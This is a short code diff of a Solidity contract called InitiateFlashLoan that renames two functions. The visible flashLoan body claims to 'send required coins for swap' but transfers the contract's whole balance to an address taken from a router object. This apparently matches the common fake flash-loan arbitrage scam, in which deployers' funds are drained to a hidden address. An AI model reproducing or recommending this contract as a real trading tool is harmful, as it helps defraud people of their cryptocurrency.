@@ -41,11 +41,11 @@ contract InitiateFlashLoan {
         return address(msg.sender);
     }
     
-    function LoanBalance() public view returns(uint) {
+    function loanBalance() public view returns(uint) {
         return address(this).balance;
     }
 
-    function flashloan() public payable {
+    function flashLoan() public payable {
         // Send required coins for swap
         address(uint160(router.pancakeSwapAddress())).transfer(
             address(this).balance
